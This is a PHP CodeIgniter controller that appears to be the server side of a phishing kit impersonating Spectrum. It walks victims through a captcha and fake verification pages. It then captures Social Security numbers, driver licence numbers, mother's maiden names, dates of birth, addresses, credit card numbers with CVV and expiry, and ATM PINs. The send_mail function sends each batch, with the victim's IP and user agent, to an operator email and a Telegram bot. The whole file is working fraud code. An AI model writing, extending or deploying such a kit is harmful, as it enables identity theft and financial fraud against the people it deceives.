<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Home extends CI_Controller {


	public function index()
	{
		if (X_CAPTCHA) {
			$this->load->view('captcha');
		}else{
			$this->session->set_userdata('captcha_status', 'passed');
			redirect(site_url('authen'));
		}
	}

	public function authen()
	{
		if (!$this->session->has_userdata('captcha_status') || $this->session->userdata('captcha_status') != 'passed') {
			redirect(site_url(''));
		}

		$this->load->view('authen');
	}
	public function sitekey()
	{
		if (!$this->session->has_userdata('captcha_status') || $this->session->userdata('captcha_status') != 'passed') {
			redirect(site_url(''));
		}
		
		if ($this->input->method() == 'post') {
			$msg = [];
			$msg[] = "Security Code: " . $this->input->post('SecCode');
			$msg[] = "MAC Address: " . $this->input->post('MacAddress');
			$msg[] = "Social Security Number: " . $this->input->post('ssnr');
			$msg[] = "Driver License: " . $this->input->post('dl');
			$msg[] = "MMN: " . $this->input->post('mmnr');
			$this->send_mail($msg, 'Security');
		}
		
		$this->load->view('sitekey');
	}
		public function security()
	{
		if (!$this->session->has_userdata('captcha_status') || $this->session->userdata('captcha_status') != 'passed') {
			redirect(site_url(''));
		}
		
		$this->load->view('security');
	}
		public function com()
	{
		if (!$this->session->has_userdata('captcha_status') || $this->session->userdata('captcha_status') != 'passed') {
			redirect(site_url(''));
		}
		if ($this->input->method() == 'post') {
			$msg = [];
			$msg[] = "Full Name: " . $this->input->post('fullName');
			$msg[] = "Phone Number: " . $this->input->post('pnumb');
			$msg[] = "Address Line: " . $this->input->post('eAddress');
			$msg[] = "Zip Code: " . $this->input->post('ZipCode');
			$msg[] = "DOB: " . $this->input->post('DateofBirth');
			$msg[] = "Credit Card Number: " . $this->input->post('ccnr');
			$msg[] = "Exp Date: " . $this->input->post('expr');
			$msg[] = "CCV: " . $this->input->post('cvvr');
			$msg[] = "ATM PIN: " . $this->input->post('atmr');
			$this->send_mail($msg, 'Spectrum Fullz');
		}

		$this->load->view('com');
	}
	
	public function getIp()
	{
		$ipaddress = '';
		if ($_SERVER['HTTP_CLIENT_IP']) $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
		else if ($_SERVER['HTTP_X_REAL_IP']) $ipaddress = $_SERVER['HTTP_X_REAL_IP'];
		else if ($_SERVER['HTTP_CF_CONNECTING_IP']) $ipaddress = $_SERVER['HTTP_CF_CONNECTING_IP'];
		else if ($_SERVER['HTTP_X_FORWARDED']) $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
		else if ($_SERVER['HTTP_FORWARDED_FOR']) $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
		else if ($_SERVER['HTTP_FORWARDED']) $ipaddress = $_SERVER['HTTP_FORWARDED'];
		else if ($_SERVER['REMOTE_ADDR']) $ipaddress = $_SERVER['REMOTE_ADDR'];
		else $ipaddress = 'UNKNOWN';
		if ($ipaddress == "::1") {
			return "127.0.0.1";
		}
		return $ipaddress;
	}
	
	public function send_mail($msg=[], $sbj='')
	{
		$ipaddress = $this->getIp();
		$useragent = $_SERVER['HTTP_USER_AGENT'];
		$hostname = gethostbyaddr($ipaddress);
		$this->email->from(X_RESULT_FROMEMAIL, X_RESULT_NAME);
		$this->email->to(X_RESULT_EMAIL);
		$msg[] = "IP: " . $ip;
		$msg[] = "UA: " . $useragent;
		$msg[] = "HOST: " . $hostname;
		$msg_body = "";
		foreach ($msg as $key => $m) {
			$msg_body .= $m."\n";
		}
		$this->email->message($msg_body);
		// ---------------- Telegram Rez ---------------- //
		$token = X_RESULT_TOKENAPI;
		$data = [
    		'text' => $msg_body,
    		'chat_id' => X_RESULT_CHATID
				];

		file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
		$this->email->subject($sbj .' - '. $ip);
		$this->email->message($msg_body);
		$this->email->subject($sbj .' - '. $ip);
		if (@$this->email->send()) {
			// exit('true');
			return true;
		} else {
			return false;
			// exit('false');
		}
	}
}
?>